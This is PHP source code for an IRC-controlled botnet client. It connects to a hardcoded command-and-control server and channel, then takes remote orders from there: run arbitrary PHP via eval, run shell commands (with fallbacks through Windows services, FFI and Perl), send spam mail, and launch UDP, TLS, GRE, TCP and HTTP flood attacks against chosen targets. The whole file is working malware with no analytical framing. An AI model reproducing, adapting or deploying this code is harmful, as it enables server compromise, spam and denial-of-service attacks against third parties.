<?php
set_time_limit(0);
error_reporting(0);
$dir = getcwd();
$uname = @php_uname();

function whereistmP()
{
    $uploadtmp = ini_get('upload_tmp_dir');
    $uf = getenv('USERPROFILE');
    $af = getenv('ALLUSERSPROFILE');
    $se = ini_get('session.save_path');
    $envtmp = (getenv('TMP')) ? getenv('TMP') : getenv('TEMP');
    if (is_dir('/tmp') && is_writable('/tmp')) return '/tmp';
    if (is_dir('/usr/tmp') && is_writable('/usr/tmp')) return '/usr/tmp';
    if (is_dir('/var/tmp') && is_writable('/var/tmp')) return '/var/tmp';
    if (is_dir($uf) && is_writable($uf)) return $uf;
    if (is_dir($af) && is_writable($af)) return $af;
    if (is_dir($se) && is_writable($se)) return $se;
    if (is_dir($uploadtmp) && is_writable($uploadtmp)) return $uploadtmp;
    if (is_dir($envtmp) && is_writable($envtmp)) return $envtmp;
    return '.';
}
function srvshelL($command)
{
    $name = whereistmP() . "\\" . uniqid('NJ');
    $n = uniqid('NJ');
    $cmd = (empty($_SERVER['ComSpec'])) ? 'd:\\windows\\system32\\cmd.exe' : $_SERVER['ComSpec'];
    win32_create_service(array(
        'service' => $n,
        'display' => $n,
        'path' => $cmd,
        'params' => "/c $command >\"$name\""
    ));
    win32_start_service($n);
    win32_stop_service($n);
    win32_delete_service($n);
    while (!file_exists($name)) sleep(1);
    $exec = file_get_contents($name);
    unlink($name);
    return $exec;
}
function ffishelL($command)
{
    $name = whereistmP() . "\\" . uniqid('NJ');
    $api = new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
    $res = $api->WinExec("cmd.exe /c $command >\"$name\"", 0);
    while (!file_exists($name)) sleep(1);
    $exec = file_get_contents($name);
    unlink($name);
    return $exec;
}
function comshelL($command, $ws)
{
    $exec = $ws->exec("cmd.exe /c $command");
    $so = $exec->StdOut();
    return $so->ReadAll();
}
function perlshelL($command)
{
    $perl = new perl();
    ob_start();
    $perl->eval("system(\"$command\")");
    $exec = ob_get_contents();
    ob_end_clean();
    return $exec;
}
function Exe($command)
{
    $exec = $output = '';
    $dep[] = array(
        'pipe',
        'r'
    );
    $dep[] = array(
        'pipe',
        'w'
    );
    if (function_exists('passthru'))
    {
        ob_start();
        @passthru_($command);
        $exec = ob_get_contents();
        ob_clean();
        ob_end_clean();
    }
    elseif (function_exists('system'))
    {
        $tmp = ob_get_contents();
        ob_clean();
        @system($command);
        $output = ob_get_contents();
        ob_clean();
        $exec = $tmp;
    }
    elseif (function_exists('exec'))
    {
        @exec($command, $output);
        $output = join("\n", $output);
        $exec = $output;
    }
    elseif (function_exists('shell_exec')) $exec = @shell_exec($command);
    elseif (function_exists('popen'))
    {
        $output = @popen($command, 'r');
        while (!feof($output))
        {
            $exec = fgets($output);
        }
        pclose($output);
    }
    elseif (function_exists('proc_open'))
    {
        $res = @proc_open($command, $dep, $pipes);
        while (!feof($pipes[1]))
        {
            $line = fgets($pipes[1]);
            $output .= $line;
        }
        $exec = $output;
        proc_close($res);
    }
    elseif (function_exists('win_shell_execute') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $exec = winshelL($command);
    elseif (function_exists('win32_create_service') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $exec = srvshelL($command);
    elseif (extension_loaded('ffi') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $exec = ffishelL($command);
    elseif (extension_loaded('perl')) $exec = perlshelL($command);
    return $exec;
}
class sell
{
    var $config = array(
        "server" => "91.92.243.35",
        "port" => "6667",
        "key" => "",
        "prefix" => "Scan-",
        "maxrand" => "7",
        "chan" => "#unix",
        "trigger" => "-",
        "password" => "",
        "auth" => "homekoro.it"
    );
    var $users = array();
    function start()
    {
        while (true)
        {
            if (!($this->conn = fsockopen($this->config['server'], $this->config['port'], $e, $s, 30))) $this->start();
            $pass = $this->config['password'];
            $alph = range("0", "9");
            $this->send("PASS " . $pass . "");
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $ident = "Windows";
            else $ident = "Linux";
            $this->send("USER " . $ident . " 127.0.0.1 localhost :" . php_uname() . "");
            $this->set_nick();
            $this->main();
        }
    }
    function main()
    {
        while (!feof($this->conn))
        {
            if (function_exists('stream_select'))
            {
                $read = array(
                    $this->conn
                );
                $write = NULL;
                $except = NULL;
                $changed = stream_select($read, $write, $except, 30);
                if ($changed == 0)
                {
                    fwrite($this->conn, "PING :lelcomeatme\r\n");
                    $read = array(
                        $this->conn
                    );
                    $write = NULL;
                    $except = NULL;
                    $changed = stream_select($read, $write, $except, 30);
                    if ($changed == 0) break;
                }
            }
            $this->buf = trim(fgets($this->conn, 512));
            $cmd = explode(" ", $this->buf);
            if (substr($this->buf, 0, 6) == "PING :")
            {
                $this->send("PONG :" . substr($this->buf, 6));
                continue;
            }
            if (isset($cmd[1]) && $cmd[1] == "001")
            {
                $this->auth($this->config['auth']);
                $this->join($this->config['chan'], $this->config['key']);
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $this->join("#unix");
                else $this->join("#unix");
                $this->join("#unix");
                $this->join("#unix");
                continue;
            }
            if (isset($cmd[1]) && $cmd[1] == "433")
            {
                $this->set_nick();
                continue;
            }
            if ($this->buf != $old_buf)
            {
                $mcmd = array();
                $msg = substr(strstr($this->buf, " :") , 2);
                $msgcmd = explode(" ", $msg);
                $nick = explode("!", $cmd[0]);
                $vhost = explode("@", $nick[1]);
                $vhost = $vhost[1];
                $nick = substr($nick[0], 1);
                $host = $cmd[0];
                if ($msgcmd[0] == $this->nick) for ($i = 0;$i < count($msgcmd);$i++) $mcmd[$i] = $msgcmd[$i + 1];
                else for ($i = 0;$i < count($msgcmd);$i++) $mcmd[$i] = $msgcmd[$i];
                if (count($cmd) > 2)
                {
                    switch ($cmd[1])
                    {
                        case "PRIVMSG":
                            if (substr($mcmd[0], 0, 1) == "-")
                            {
                                switch (substr($mcmd[0], 1))
                                {
                                    case "mail":
                                        if (count($mcmd) > 4)
                                        {
                                            $header = "From: <" . $mcmd[2] . ">";
                                            if (!mail($mcmd[1], $mcmd[3], strstr($msg, $mcmd[4]) , $header))
                                            {
                                                $this->privmsg($this->config['chan'], "[\2mail\2]: failed sending.");
                                            }
                                            else
                                            {
                                                $this->privmsg($this->config['chan'], "[\2mail\2]: sent.");
                                            }
                                        }
                                    break;
                                    case "dns":
                                        if (isset($mcmd[1]))
                                        {
                                            $ip = explode(".", $mcmd[1]);
                                            if (count($ip) == 4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))
                                            {
                                                $this->privmsg($this->config['chan'], "[\2dns\2]: " . $mcmd[1] . " => " . gethostbyaddr($mcmd[1]));
                                            }
                                            else
                                            {
                                                $this->privmsg($this->config['chan'], "[\2dns\2]: " . $mcmd[1] . " => " . gethostbyname($mcmd[1]));
                                            }
                                        }
                                    break;
                                    case "fas":
                                        $this->privmsg($this->config['chan'], "~http://" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['REQUEST_URI'] . "");
                                    break;
                                    case "uname":
                                        if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
                                        {
                                            $safemode = "on";
                                        }
                                        else
                                        {
                                            $safemode = "off";
                                        }
                                        $uname = php_uname();
                                        $this->privmsg($this->config['chan'], "[\2info\2]: " . $uname . " (safe: " . $safemode . ")");
                                    break;
                                    case "raw":
                                        $this->send(strstr($msg, $mcmd[1]));
                                    break;
                                    case "eval":
                                        ob_start();
                                        eval(strstr($msg, $mcmd[1]));
                                        $exec = ob_get_contents();
                                        ob_end_clean();
                                        $ret = explode("\n", $exec);
                                        for ($i = 0;$i < count($ret);$i++) if ($ret[$i] != NULL) $this->privmsg($this->config['chan'], " : " . trim($ret[$i]));
                                        break;
                                    case "exec":
                                        $command = substr(strstr($msg, $mcmd[0]) , strlen($mcmd[0]) + 1);
                                        $exec = exec($command);
                                        $ret = explode("\n", $exec);
                                        for ($i = 0;$i < count($ret);$i++) if ($ret[$i] != NULL) $this->privmsg($this->config['chan'], " : " . trim($ret[$i]));
                                        break;
case "helpddos":
$this->privmsg($this->config['chan'], "[\2===================\2]");
$this->privmsg($this->config['chan'], "[\2=====CmD DDOS!=====\2]");
$this->privmsg($this->config['chan'], "[\2-udp IP PORTA SECONDI !\2]");
$this->privmsg($this->config['chan'], "[\2-udptls IP PORTA SECONDI!\2]");
$this->privmsg($this->config['chan'], "[\2-udpstd IP PORTA SECONDI!\2]");
$this->privmsg($this->config['chan'], "[\2-udpflood IP PORTA SECONDI PACKETSIZE!\2]");
$this->privmsg($this->config['chan'], "[\2-greflood IP PORTA SECONDI PACKETSIZE!\2]");
$this->privmsg($this->config['chan'], "[\2-die Quit BOT\2]");
break;
                                    case "udp":
                                        if (count($mcmd) > 3)
                                        {
                                            $this->udp($mcmd[1], $mcmd[2], $mcmd[3]);
                                        }
                                        break;

                                    case "udptls":
                                        if (count($mcmd) > 3)
                                        {
                                            $this->udp($mcmd[1], $mcmd[2], $mcmd[3]);
                                        }
                                        break;

                                    case "udpstd":
                                        if (count($mcmd) > 3)
                                        {
                                            $this->udp($mcmd[1], $mcmd[2], $mcmd[3]);
                                        }
                                        break;
                                    case "udpflood":
                                        if (count($mcmd) > 4)
                                        {
                                            $this->udpflood($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
                                        }
                                        break;

                                    case "greflood":
                                        if (count($mcmd) > 4)
                                        {
                                            $this->greflood($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
                                        }
                                        break;
                                    case "joinchan":
                                        if (count($mcmd) > 1)
                                        {
                                            $this->joinchan($mcmd[1]);
                                        }
                                        break;
                                    case "tcpconn":
                                        if (count($mcmd) > 3)
                                        {
                                            $this->tcpconn($mcmd[1], $mcmd[2], $mcmd[3]);
                                        }
                                        break;
                                    case "die":
                                        if (count($mcmd) > 0)
                                        {
                                            fclose($this->conn);
                                            exit();
                                        }
                                        break;
                                    }
                                }
                                break;
                            }
                        }
                }
            }
    }
    function send($msg)
    {
        fwrite($this->conn, $msg . "\r\n");
    }
    function join($chan, $key = NULL)
    {
        $this->send("JOIN " . $chan . " " . $key);
    }
    function auth($chan)
    {
        $this->send("PART " . $chan);
    }
    function privmsg($to, $msg)
    {
        $this->send("PRIVMSG " . $to . " :" . $msg);
    }
    function notice($to, $msg)
    {
        $this->send("NOTICE " . $to . " :" . $msg);
    }
    function set_nick()
    {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $ident = "WIN";
        else $ident = "UNIX";
        $prefix = "" . $ident . "[r00t3d]Xe%s";
        $nickk = substr(str_shuffle("1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ") , 0, $this->config['maxrand']);
        $this->nick = sprintf($prefix, $nickk);
        $this->send("NICK " . $this->nick);
    }
    function joinchan($chnl)
    {
        $this->privmsg($this->config['chan'], "Joining " . $chnl . " channel");
        $this->join($chnl);
        {
        }
        $this->privmsg($this->config['chan'], "Joined " . $chnl . "!");
    }
    function udpstd($host, $port, $time)
    {
        $packetsize = 1000;
        $this->privmsg($this->config['chan'], "[\2UDPSTD: DDOS ATTIVATO\2]");
        $msgg = "STD";
        for ($i = 0;$i < $packetsize;$i++)
        {
            $msgg .= chr(rand(1, 256));
        }
        $end = time() + $time;
        $i = 0;
        $fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
        while (true)
        {
            fwrite($fp, $msgg);
            fflush($fp);
            if ($i % 100 == 0)
            {
                if ($end < time()) break;
            }
            $i++;
        }
        fclose($fp);
        $env = $i * $packetsize;
        $env = $env / 1048576;
        $vel = $env / $time;
        $vel = round($vel);
        $env = round($env);
        $this->privmsg($this->config['chan'], "[\2 DDOS FINITO =)\2]: " . $env . " MB sent / Average: " . $vel . " MB/s ");
    }
    function udp($host, $port, $time)
    {
        $packetsize = 65500;
        $this->privmsg($this->config['chan'], "[\2UDP: DDOS ATTIVATO!\2]");
        $packet = "";
        for ($i = 0;$i < $packetsize;$i++)
        {
            $packet .= chr(rand(1, 256));
        }
        $end = time() + $time;
        $i = 0;
        $fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
        while (true)
        {
            fwrite($fp, $packet);
            fflush($fp);
            if ($i % 100 == 0)
            {
                if ($end < time()) break;
            }
            $i++;
        }
        fclose($fp);
        $env = $i * $packetsize;
        $env = $env / 1048576;
        $vel = $env / $time;
        $vel = round($vel);
        $env = round($env);
        $this->privmsg($this->config['chan'], "[\2DDOS FINITO\2]: " . $env . " MB sent / Average: " . $vel . " MB/s ");
    }
    function udptls($host, $port, $time)
    {
        $packetsize = 65500;
        $this->privmsg($this->config['chan'], "[\2UDPTLS: DDOS ATTIVATO!\2]");
        $packet = "";
        for ($i = 0;$i < $packetsize;$i++)
        {
            $packet .= chr(rand(1, 256));
        }
        $end = time() + $time;
        $i = 0;
        $fp = fsockopen("tls://" . $host, $port, $e, $s, 5);
        while (true)
        {
            fwrite($fp, $packet);
            fflush($fp);
            if ($i % 100 == 0)
            {
                if ($end < time()) break;
            }
            $i++;
        }
        fclose($fp);
        $env = $i * $packetsize;
        $env = $env / 1048576;
        $vel = $env / $time;
        $vel = round($vel);
        $env = round($env);
        $this->privmsg($this->config['chan'], "[\2DDOS FINITO\2]: " . $env . " MB sent / Average: " . $vel . " MB/s ");
    }
    function udpflood($host, $port, $time, $packetsize)
    {
        $this->privmsg($this->config['chan'], "\2UDPFLOOD ATTIVO\2: " . $host . ":" . $port . "  " . $time . "  " . $packetsize . "");
        $packet = "";
        $backetsize = 1;
        for ($i = 0;$i < $backetsize;$i++)
        {
            $packet .= chr(rand(1, 256));
        }
        $end = time() + $time;
        $multitarget = false;
        if (strpos($host, ",") !== false)
        {
            $multitarget = true;
            $host = explode(",", $host);
        }
        $i = 0;
        if ($multitarget)
        {
            $fp = array();
            foreach ($host as $hostt) $fp[] = fsockopen("udp://" . $hostt, $port, $e, $s, 5);

            $count = count($host);
            while (true)
            {
                fwrite($fp[$i % $count], $packet);
                fflush($fp[$i % $count]);
                if ($i % 100 == 0)
                {
                    if ($end < time()) break;
                }
                $i++;
            }
            foreach ($fp as $fpp) fclose($fpp);
        }
        else
        {
            $fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
            while (true)
            {
                fwrite($fp, $packet);
                fflush($fp);
                if ($i % 100 == 0)
                {
                    if ($end < time()) break;
                }
                $i++;
            }
            fclose($fp);
        }
        $env = $i * $packetsize;
        $env = $env / 1048576;
        $vel = $env / $time;
        $vel = round($vel);
        $env = round($env);
        $this->privmsg($this->config['chan'], "\2UDPFlood Finito \2: " . $host . ":" . $port . " Total MB sent:" . $env . " Average:" . $vel . " MB/s ");
    }
    function greflood($host, $port, $time, $packetsize)
    {
        $this->privmsg($this->config['chan'], "[\2BOTS DDOSING!\2]");
        $packet = "";
        for ($i = 0;$i < $packetsize;$i++)
        {
            $packet .= chr(rand(1, 256));
        }
        $end = time() + $time;
        $multitarget = false;
        if (strpos($host, ",") !== false)
        {
            $multitarget = true;
            $host = explode(",", $host);
        }
        $i = 0;
        if ($multitarget)
        {
            $fp = array();
            foreach ($host as $hostt) $fp[] = fsockopen("gre://" . $hostt, $port, $e, $s, 5);

            $count = count($host);
            while (true)
            {
                fwrite($fp[$i % $count], $packet);
                fflush($fp[$i % $count]);
                if ($i % 100 == 0)
                {
                    if ($end < time()) break;
                }
                $i++;
            }

            foreach ($fp as $fpp) fclose($fpp);
        }
        else
        {
            $fp = fsockopen("gre://" . $host, $port, $e, $s, 5);
            while (true)
            {
                fwrite($fp, $packet);
                fflush($fp);
                if ($i % 100 == 0)
                {
                    if ($end < time()) break;
                }
                $i++;
            }
            fclose($fp);
        }
        $env = $i * $packetsize;
        $env = $env / 1048576;
        $vel = $env / $time;
        $vel = round($vel);
        $env = round($env);
        $this->privmsg($this->config['chan'], "[\2DDOS ENDED!\2]: " . $env . " MB sent / Average: " . $vel . " MB/s ");
    }
    function attack_http($mthd, $server, $time, $url = '/')
    {
        $timei = time();
        $fs = array();
        $this->privmsg($this->config['chan'], "[\2Layer 7 {$mthd}$url Attack Started On : $server!\2]");
        $request = "$mthd $url HTTP/1.1\r\n";
        $request .= "Host: $server\r\n";
        $request .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16\r\n";
        $request .= "Keep-Alive: $time\r\n";
        $request .= "Accept: *.*\r\n\r\n";
        $timei = time();
        for ($i = 0;$i < 100;$i++)
        {
            $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
        }
        while ((time() - $timei < $time))
        {
            for ($i = 0;$i < 100;$i++)
            {
                if (@fwrite($fs[$i], $request))
                {
                    continue;
                }
                else
                {
                    $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
                }
            }
        }
        $this->privmsg($this->config['chan'], "[\2Layer 7 {$mthd} Attack Finished!\2]");
    }
    function attack_post($server, $time)
    {
        $timei = time();
        $fs = array();
        $this->privmsg($this->config['chan'], "[\2Layer 7 Post Attack Started On : $server!\2]");
        $request = "POST /" . md5(rand()) . " HTTP/1.1\r\n";
        $request .= "Host: $server\r\n";
        $request .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16\r\n";
        $request .= "Keep-Alive: $time\r\n";
        $request .= "Content-Length: 1000000000\r\n";
        $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $request .= "Accept: *.*\r\n\r\n";
        for ($i = 0;$i < 100;$i++)
        {
            $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
        }
        while ((time() - $timei < $time))
        {
            for ($i = 0;$i < 100;$i++)
            {
                if (@fwrite($fs[$i], $request))
                {
                    continue;
                }
                else
                {
                    $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
                }
            }
        }
        fclose($sockfd);
        $this->privmsg($this->config['chan'], "[\2Layer 7 Post Attack Finished!\2]");
    }
    function tcp($host, $port, $time)
    {
        $this->privmsg($this->config['chan'], "[\2tcp started!\2]");
        $end = time() + $time;
        $i = 0;
        while ($end > time())
        {
            $fp = fsockopen("tcp://" . $host, $port, $e, $s, 5);
            fclose($fp);
            $i++;
        }
        $this->privmsg($this->config['chan'], "[\2tcp Finished!\2]: sent " . $i . " connections to $host:$port.");
    }
}
$poll = new sell;
$poll->start();
?>


